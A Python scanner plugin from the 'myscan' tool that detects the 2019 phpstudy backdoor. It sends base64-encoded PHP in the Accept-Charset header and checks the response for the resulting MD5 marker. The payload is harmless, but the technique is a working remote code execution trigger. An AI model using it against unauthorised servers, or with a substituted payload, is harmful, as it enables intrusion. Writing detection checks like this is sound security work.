#!/usr/bin/env python3
# @Time    : 2020-02-17
# @Author  : caicai
# @File    : poc_phpstudy_backdoor_2019.py
import copy
from myscan.config import scan_set
from myscan.lib.helper.request import request
from myscan.lib.parse.response_parser import response_parser


class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        self.url = workdata.get("data")  # self.url为需要测试的url，值为目录url，会以/结尾,如https://www.baidu.com/home/ ,为目录
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "phpstudy backdoor"
        self.vulmsg = '''Affected Version: "phpstudy 2016-phpstudy 2018 php 5.2 php 5.4"
    vuln_url: "php_xmlrpc.dll"'''
        self.level = 2  # 0:Low  1:Medium 2:High

    def verify(self):
        # 根据config.py 配置的深度，限定一下目录深度
        if self.url.count("/") > int(scan_set.get("max_dir", 1)) + 2:
            return

        request_headers = self.dictdata.get("request").get("headers")
        request_headers_forpayload = copy.deepcopy(request_headers)
        request_headers_forpayload["Accept-Encoding"] = "gzip,deflate"
        request_headers_forpayload["Accept-Charset"] = "cHJpbnRmKG1kNSgzMzMpKTs="
        req = {
            "method": "GET",
            "url": self.url,
            "headers": request_headers_forpayload,  # 主要保留cookie等headers
            "timeout": 10,
            "verify": False,
        }

        r = request(**req)
        if r and b"310dcbbf4cce62f762a2aaa148d556bd" in r.content:
            parse_=response_parser(r)
            self.result.append({
                "name": self.name,
                "url": self.url,
                "level": self.level,  # 0:Low  1:Medium 2:High
                "detail": {
                    "vulmsg": self.vulmsg,
                    "request":parse_.getrequestraw(),
                    "response":parse_.getresponseraw()
                }
            })

